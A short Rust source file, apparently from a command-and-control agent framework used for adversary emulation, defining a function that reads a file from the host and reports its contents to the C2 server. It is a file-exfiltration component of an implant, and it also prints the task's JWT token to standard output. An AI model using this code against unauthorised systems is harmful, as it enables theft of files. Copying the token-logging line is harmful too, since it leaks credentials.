use alloc::string::String;
use alloc::sync::Arc;
use eldritch_agent::{Agent, TaskContext};
use pb::{c2, eldritch};

pub fn file(agent: Arc<dyn Agent>, task_context: TaskContext, path: String) -> Result<(), String> {
    let content = std::fs::read(&path).map_err(|e| e.to_string())?;

    let metadata = eldritch::FileMetadata {
        path: path.clone(),
        ..Default::default()
    };
    let file_msg = eldritch::File {
        metadata: Some(metadata),
        chunk: content,
    };

    println!("reporting file chunk with JWT: {}", task_context.jwt);
    let req = c2::ReportFileRequest {
        context: Some(task_context.into()),
        chunk: Some(file_msg),
    };

    agent.report_file(req).map(|_| ())
}
